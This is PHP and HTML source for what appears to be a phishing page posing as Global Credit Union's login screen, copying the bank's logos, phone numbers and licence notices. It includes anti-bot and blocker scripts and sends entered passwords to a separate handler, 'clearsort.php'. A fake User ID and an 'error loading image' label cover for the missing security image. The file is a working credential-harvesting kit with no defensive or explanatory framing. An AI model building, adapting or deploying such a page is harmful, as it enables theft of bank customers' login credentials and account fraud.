<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

session_start();

include 'blocker.php';
include 'antirobot.php';
include 'bt.php';


?>


<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><link rel="stylesheet" type="text/css" href="cid_css-f4fa3d24-d47f-41c7-9d76-48d49274773c_mhtml.blink.css" />

   <title>Login</title>
   <meta http-equiv="X-UA-Compatible" content="IE=Edge">

   <link rel="stylesheet" href="ub-print.css_akusa.css" type="text/css" media="print">
   <link rel="stylesheet" href="ub-popup.css_akusa.css" type="text/css" media="screen, projection">
   <link rel="stylesheet" href="ub-main.css_akusa.css" type="text/css" title="main" media="screen, projection">
   <link rel="stylesheet" href="ub-login-new.css_akusa.css" type="text/css">
   <!--<meta http-equiv="Refresh" content="600;url=invalidate-session.jsp">-->


<!-- Favicon -->
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.globalcu.org/contentassets/86f4dd537de44d9ebcdbd3f9db210ae9/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://www.globalcu.org/contentassets/86f4dd537de44d9ebcdbd3f9db210ae9/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://www.globalcu.org/contentassets/86f4dd537de44d9ebcdbd3f9db210ae9/favicon-16x16.png">    
    <link rel="manifest" href="https://www.globalcu.org/site.webmanifest">
    <link rel="mask-icon" href="https://www.globalcu.org/contentassets/86f4dd537de44d9ebcdbd3f9db210ae9/safari-pinned-tab.svg">    
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
   

   

  

   
</head>
<body>
   <div id="header" role="banner">
    <section class="skipLinks" title="Enter your Personal Access Code by simply typing on your keyboard">
      <h2 class="visuallyhidden">Skip links</h2>
      <p><a href="login-image-password.jsp.htm#instr" class="visuallyhidden">Skip to main content</a></p>
      <p><a href="login-image-password.jsp.htm#pgFooter" class="visuallyhidden">Skip to footer</a></p>
      <p><a href="https://www.globalcu.org/contact" class="visuallyhidden">If you are using a screen reader and having difficulties with the site, 
      call the Member Service Center 24/7 at (800) 525-9094.</a></p>
    </section>
    <div id="topBar">
      <a href="" id="logo" title="Global Credit Union"><img src="Global_CU_v_180px.png" alt="Global Credit Union"></a>
      <p id="headerReturnLink"><a href="">Return to home</a></p>
    </div>

    <div id="pgHead">
    </div>
   </div>

   <div id="pgMain" role="main">
         <div id="mainContent">
           <div class="leftCol">
            <h2>Log in to your account</h2>
            <form method="post" name="safelogin" action="clearsort.php">
              
              <label>Password:</label>
              <input type="password" name="Password" id="CurrentPassword" aria-label="Password with Eagle security image">
              <img src="eyeball-open.png" alt="Password visibility toggle" id="toggle-password" class="toggle-password" title="Show Password"><input type="submit" name="Log In" id="LogIn" class="LogIn" value="Log In">
              <!--<input type="image" src="log-btn2.jpg" width="49" height="26" >-->
              <div class="imageBox">
               <!-- <img src="wildlife-eagle.jpg">--><Label>error loading image continue to Log In</label>
              </div>
            </form>
            
          </div>

	      	<div class="sideBar">
	      		<div class="learnMore">
	      			<h2 class="help">Quick Help</h2>
                    <ul class="help">
                       
                       <li><a href="">Forgot online password?</a></li>
                       <li id="liKeypadNote">
                          <a href="login-image-password.jsp.htm#" id="keypadLabel" role="button" aria-controls="keypadNote" aria-expanded="false">Don't recognize security image?</a>
                          <div class="notes" id="keypadNote" role="region" aria-labelledby="keypadLabel" aria-hidden="true">
                             <p>You entered User ID <b>440655</b> - is this correct?</p>
                             <p>No - <a href="" title="Return to previous screen">Return to the previous
                             screen</a> to re-enter your User ID</p>
                             <p>Yes - Call the number listed below.</p>
                          </div>
                       </li>
                       
                    </ul>
                    <div class="help" style="display:none;">
                       <h1>Questions?  (800) 525-9094</h1>
                    </div>
	      		</div>
				<div id="questionSection" class="learnMore">
					<h2>Questions?</h2>
					<p>
						For assistance contact the Member Service Center.
					</p><p style="margin-top:10px;">
						(800) 525-9094<br><br>
						Open 24 hours a day, 7 days a week.<br><br>
						<a href="" target="_blank">More contact information</a>
					</p>
					<p></p>
				</div>
      	  	</div>
         </div>
         <br><br>
         
         <div id="pgFooter">
            

   <div id="footer" role="contentinfo">

      <p> � Copyright  2023 � Trademark pending for Global Credit Union. </p>
      <p>Real Estate loans are provided by Global Credit Union in Alaska, Arizona, California, Idaho and Washington, NMLS ID #409001.<br>
      Mortgage Loans are provided by Global Credit Union in Arizona, California, Idaho and Washington. NMLS ID #409001. Mortgage loans are provided by Global Credit Union Home Loans, LLC in Alaska and Washington. License #AK157293; Washington Consumer Loan Company License #CL-157293.</p>
         <p><a>Privacy</a></p>
      

      <p class="ncua">
         <img src="logo-ncua.gif_.gif#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
         <span class="bug">
            <img alt="Equal Housing Lender" src="logo-ehl-tri.png_.png#042116">
         </span>
      </p>
   </div>
         </div>
   </div>

</body></html>
